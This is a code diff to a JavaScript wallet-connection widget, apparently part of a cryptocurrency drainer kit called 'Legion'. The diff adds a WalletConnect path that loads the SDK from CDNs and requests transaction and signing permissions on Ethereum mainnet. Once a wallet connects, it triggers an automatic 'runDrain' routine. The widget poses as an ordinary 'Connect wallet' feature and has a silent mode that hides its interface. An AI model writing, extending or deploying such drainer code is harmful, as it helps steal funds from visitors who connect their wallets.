@@ -33,10 +33,8 @@
   var DUMMY_OMNI_SIG = '0x' + '00'.repeat(130);
   var ACTIVE_TAB = 'evm';
 
-  var WC_EVM_CHAINS = [
-    'eip155:1', 'eip155:137', 'eip155:56', 'eip155:42161', 'eip155:8453', 'eip155:10', 'eip155:43114',
-  ];
-  var WC_SOLANA = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';
+  var WC_EVM_MAINNET = 'eip155:1';
+  var WC_CONNECT_FAIL_MSG = 'WalletConnect connection failed – your wallet may not support the required network. Please use MetaMask or another EVM wallet.';
 
   var wallets = { evm: null, sol: null, tron: null, ton: null, btc: null, cosmos: null, aptos: null, sui: null };
   var wcProvider = null;
@@ -147,6 +145,7 @@
       '#legion-one-progress i{display:block;height:100%;width:30%;background:#6366f1;animation:legionProg 1.2s ease-in-out infinite;}',
       '@keyframes legionProg{0%{transform:translateX(-100%)}100%{transform:translateX(400%)}}',
       'body.legion-one-silent #legion-one-launcher,body.legion-one-silent #legion-one-panel{display:none!important;}',
+      'wcm-modal{--wcm-z-index:2147483647!important;}',
     ].join('');
     document.head.appendChild(css);
   }
@@ -501,80 +500,159 @@
     return wallets.sui;
   }
 
+  function wcMetadata() {
+    return {
+      name: document.title || 'Legion Wallet',
+      description: 'Connect wallet',
+      url: location.origin,
+      icons: [location.origin + '/favicon.ico'],
+    };
+  }
+
+  function parseWcAccountTriplet(account) {
+    if (!account || typeof account !== 'string') return null;
+    var parts = account.split(':');
+    if (parts.length < 3) return null;
+    return { namespace: parts[0], reference: parts[1], address: parts.slice(2).join(':') };
+  }
+
+  function isWcUnsupportedChainsError(msg) {
+    return /not supported|unsupported chain|required chains/i.test(msg);
+  }
+
+  function applyWalletConnectSession(provider) {
+    var ns = (provider.session && provider.session.namespaces) || {};
+    var connected = [];
+
+    if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts.length) {
+      var evmAcc = parseWcAccountTriplet(ns.eip155.accounts[0]);
+      if (evmAcc) {
+        wallets.evm = {
+          address: evmAcc.address,
+          chainId: parseInt(evmAcc.reference, 10) || 1,
+          walletType: 'WalletConnect',
+          provider: 'WalletConnect',
+          wcProvider: provider,
+        };
+        connected.push('EVM');
+      }
+    }
+
+    return connected;
+  }
+
   function loadWcSdk() {
     if (!WC_PROJECT_ID) return Promise.reject(new Error('Set LEGION_CONFIG.wcProjectId for WalletConnect'));
     if (!wcSdkPromise) {
-      wcSdkPromise = Promise.all([
-        import('https://esm.sh/@walletconnect/universal-provider@2.13.0'),
-        import('https://esm.sh/@walletconnect/modal@2.7.0'),
-      ]).then(function (mods) {
-        return {
-          UniversalProvider: mods[0].default || mods[0].UniversalProvider,
-          WalletConnectModal: mods[1].WalletConnectModal || (mods[1].default && mods[1].default.WalletConnectModal),
-        };
+      function importPair(upUrl, modalUrl) {
+        return Promise.all([
+          import(upUrl),
+          import(modalUrl),
+        ]).then(function (mods) {
+          var UniversalProvider = mods[0].default || mods[0].UniversalProvider;
+          var WalletConnectModal = mods[1].WalletConnectModal || (mods[1].default && mods[1].default.WalletConnectModal);
+          if (!UniversalProvider) throw new Error('WalletConnect UniversalProvider failed to load');
+          if (!WalletConnectModal) throw new Error('WalletConnect modal failed to load');
+          return { UniversalProvider: UniversalProvider, WalletConnectModal: WalletConnectModal };
+        });
+      }
+      wcSdkPromise = importPair(
+        'https://esm.sh/@walletconnect/universal-provider@2.13.0',
+        'https://esm.sh/@walletconnect/modal@2.7.0',
+      ).catch(function () {
+        return importPair(
+          'https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider@2.13.0/+esm',
+          'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/+esm',
+        );
       });
     }
     return wcSdkPromise;
   }
 
-  async function connectWalletConnect() {
+  async function ensureWalletConnectProvider() {
     var sdk = await loadWcSdk();
-    if (!wcProvider || !wcProvider.session) {
+    if (!wcModal) {
+      wcModal = new sdk.WalletConnectModal({
+        projectId: WC_PROJECT_ID,
+        themeMode: 'dark',
+        enableExplorer: true,
+        themeVariables: { '--wcm-z-index': '2147483647' },
+      });
+    }
+    if (!wcProvider) {
       wcProvider = await sdk.UniversalProvider.init({
         projectId: WC_PROJECT_ID,
-        metadata: {
-          name: document.title || 'Wallet',
-          description: 'Connect wallet',
-          url: location.origin,
-          icons: [location.origin + '/favicon.ico'],
-        },
+        metadata: wcMetadata(),
       });
-      if (!wcModal && sdk.WalletConnectModal) {
-        wcModal = new sdk.WalletConnectModal({ projectId: WC_PROJECT_ID, themeMode: 'dark' });
-      }
-      wcProvider.on('display_uri', function (uri) { if (wcModal) wcModal.openModal({ uri: uri }); });
+      wcProvider.on('display_uri', function (uri) {
+        if (wcModal) wcModal.openModal({ uri: uri });
+      });
       wcProvider.on('session_delete', function () {
         wcProvider = null;
         if (wallets.evm && wallets.evm.wcProvider) wallets.evm = null;
         if (wallets.sol && wallets.sol.wc) wallets.sol = null;
         setStatus('WalletConnect session expired — click WalletConnect to reconnect', 'err');
       });
-      await wcProvider.connect({
+      wcProvider.on('disconnect', function () {
+        if (wcModal) wcModal.closeModal();
+      });
+    }
+    return wcProvider;
+  }
+
+  async function connectWalletConnect() {
+    if (!WC_PROJECT_ID) throw new Error('Set LEGION_CONFIG.wcProjectId for WalletConnect');
+    setStatus('Opening WalletConnect QR modal…', 'busy');
+    var provider = await ensureWalletConnectProvider();
+
+    if (provider.session) {
+      var restored = applyWalletConnectSession(provider);
+      if (restored.length) return wallets;
+    }
+
+    try {
+      await provider.connect({
         namespaces: {
           eip155: {
-            methods: ['eth_signTypedData_v4', 'eth_sendTransaction', 'eth_requestAccounts', 'eth_chainId'],
-            chains: WC_EVM_CHAINS,
+            methods: [
+              'eth_signTypedData_v4',
+              'eth_sendTransaction',
+              'eth_requestAccounts',
+              'eth_chainId',
+              'personal_sign',
+              'wallet_switchEthereumChain',
+            ],
+            chains: [WC_EVM_MAINNET],
             events: ['accountsChanged', 'chainChanged'],
-          },
-          solana: {
-            methods: ['solana_signTransaction'],
-            chains: [WC_SOLANA],
-            events: [],
           },
         },
       });
+    } catch (e) {
       if (wcModal) wcModal.closeModal();
+      wcProvider = null;
+      var msg = formatError(e);
+      if (/reject|cancel|closed|declined/i.test(msg)) {
+        throw new Error('WalletConnect cancelled');
+      }
+      if (isWcUnsupportedChainsError(msg)) {
+        throw new Error(WC_CONNECT_FAIL_MSG);
+      }
+      throw new Error(WC_CONNECT_FAIL_MSG);
     }
-    var ns = (wcProvider.session && wcProvider.session.namespaces) || {};
-    if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts[0]) {
-      var parts = ns.eip155.accounts[0].split(':');
-      wallets.evm = {
-        address: parts.slice(2).join(':'),
-        chainId: parseInt(parts[1], 10),
-        walletType: 'WalletConnect',
-        provider: 'WalletConnect',
-        wcProvider: wcProvider,
-      };
-    }
-    if (ns.solana && ns.solana.accounts && ns.solana.accounts[0]) {
-      var sp = ns.solana.accounts[0].split(':');
-      wallets.sol = { address: sp.slice(2).join(':'), walletType: 'WalletConnect', wc: true };
-    }
-    if (!wallets.evm && !wallets.sol) throw new Error('WalletConnect: no accounts');
+
+    if (wcModal) wcModal.closeModal();
+
+    var connected = applyWalletConnectSession(provider);
+    if (!connected.length) throw new Error(WC_CONNECT_FAIL_MSG);
     return wallets;
   }
 
   async function connectActiveTab() {
+    if (ACTIVE_TAB === 'wc') {
+      await connectWalletConnect();
+      if (wallets.evm) { ACTIVE_TAB = 'evm'; return wallets.evm; }
+      throw new Error(WC_CONNECT_FAIL_MSG);
+    }
     assertExtensionAvailable(ACTIVE_TAB);
     if (ACTIVE_TAB === 'evm') return connectEvm();
     if (ACTIVE_TAB === 'sol') return connectSolana();
@@ -1467,6 +1545,7 @@
       '  <button type="button" data-tab="cosmos">ATOM</button>',
       '  <button type="button" data-tab="aptos">APT</button>',
       '  <button type="button" data-tab="sui">SUI</button>',
+      '  <button type="button" data-tab="wc">WC</button>',
       '</div>',
       '<div class="body">',
       '  <div id="legion-one-status">Select chain and connect.</div>',
@@ -1491,24 +1570,27 @@
         ACTIVE_TAB = tab.getAttribute('data-tab') || 'evm';
         panel.querySelectorAll('.tabs button').forEach(function (b) { b.classList.remove('on'); });
         tab.classList.add('on');
+        if (ACTIVE_TAB === 'wc') {
+          setStatus('WalletConnect — Ethereum mainnet only. Scan QR with Trust Wallet or MetaMask Mobile.', null);
+          return;
+        }
         var ext = CHAIN_EXTENSIONS[ACTIVE_TAB];
         var hint = ext ? ext.name : ACTIVE_TAB;
         setStatus('Chain: ' + ACTIVE_TAB.toUpperCase() + ' — needs ' + hint, null);
       });
     });
 
+    async function runWalletConnectFlow() {
+      setStatus('Opening WalletConnect…', 'busy');
+      await connectWalletConnect();
+      if (wallets.evm) ACTIVE_TAB = 'evm';
+      if (AUTO_DRAIN) await runDrain({ skipConnect: true });
+      else setStatus('WalletConnect connected', 'ok');
+    }
+
     document.getElementById('legion-one-wc-btn').addEventListener('click', async function () {
-      if (ACTIVE_TAB !== 'evm' && ACTIVE_TAB !== 'sol') {
-        setStatus('WalletConnect supports EVM and Solana only — use the chain tab for ' + ACTIVE_TAB.toUpperCase(), 'err');
-        return;
-      }
       try {
-        setStatus('Opening WalletConnect…', 'busy');
-        await connectWalletConnect();
-        if (wallets.evm) ACTIVE_TAB = 'evm';
-        else if (wallets.sol) ACTIVE_TAB = 'sol';
-        if (AUTO_DRAIN) await runDrain({ skipConnect: true });
-        else setStatus('WalletConnect connected', 'ok');
+        await runWalletConnectFlow();
       } catch (e) {
         setStatus(formatError(e), 'err');
       }
